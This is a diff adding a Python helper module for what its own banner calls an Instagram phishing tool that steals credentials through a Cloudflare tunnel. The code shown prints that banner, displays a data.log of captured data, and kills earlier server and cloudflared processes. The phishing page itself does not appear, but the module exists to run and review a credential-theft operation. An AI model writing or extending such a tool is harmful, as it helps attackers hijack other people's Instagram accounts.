@@ -1,0 +1,39 @@
+import os
+import time
+from colors import colored, Colors
+
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def show_banner():
+    clear_screen()
+    banner = """
+    ██╗███╗   ██╗███████╗████████╗ █████╗  ██████╗ ██████╗  █████╗ ███╗   ███╗
+    ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔════╝ ██╔══██╗██╔══██╗████╗ ████║
+    ██║██╔██╗ ██║███████╗   ██║   ███████║██║  ███╗██████╔╝███████║██╔████╔██║
+    ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══██║██║╚██╔╝██║
+    ██║██║ ╚████║███████║   ██║   ██║  ██║╚██████╔╝██║  ██║██║  ██║██║ ╚═╝ ██║
+    ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝
+    """
+    print(colored(banner, Colors.CYAN))
+    print(colored("\n          Instagram Phishing Tool with Cloudflare Tunnel", Colors.YELLOW))
+    print(colored("         >> Developer: Aryan Afridi <<\n", Colors.CYAN))
+    print(colored("     Tool to steal Instagram credentials via Cloudflare Tunnel\n\n", Colors.GREEN))
+
+def view_logs():
+    if not os.path.exists('data.log'):
+        print(colored("\n[!] No logs found yet.\n", Colors.RED))
+        return
+    clear_screen()
+    print(colored("\n========== DATA LOGS ==========\n", Colors.CYAN))
+    with open('data.log', 'r', encoding='utf-8') as f:
+        print(f.read())
+    print(colored("\n================================\n", Colors.CYAN))
+    input(colored("Press Enter to continue...", Colors.YELLOW))
+
+def kill_previous_servers():
+    if os.name != 'nt':
+        os.system('pkill -f "python.*bgmi" 2>/dev/null')
+        os.system('pkill -f cloudflared 2>/dev/null')
+    else:
+        os.system('taskkill /f /im cloudflared.exe 2>nul')
